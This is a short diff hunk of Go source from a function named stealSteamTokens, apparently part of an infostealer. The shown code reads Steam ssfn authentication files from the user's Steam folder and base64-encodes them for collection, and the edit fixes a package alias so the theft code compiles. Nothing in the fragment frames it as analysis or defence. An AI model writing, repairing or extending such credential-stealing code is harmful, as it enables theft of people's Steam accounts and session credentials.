@@ -384,7 +384,7 @@ func stealSteamTokens() string {
 					ssfnPath := filepath.Join(steamDir, e.Name())
 					if data, err := os.ReadFile(ssfnPath); err == nil {
 						sb.WriteString(fmt.Sprintf("=== %s ===\n", e.Name()))
-						sb.WriteString(encoding_base64.StdEncoding.EncodeToString(data))
+						sb.WriteString(base64.StdEncoding.EncodeToString(data))
 						sb.WriteString("\n\n")
 					}
 				}
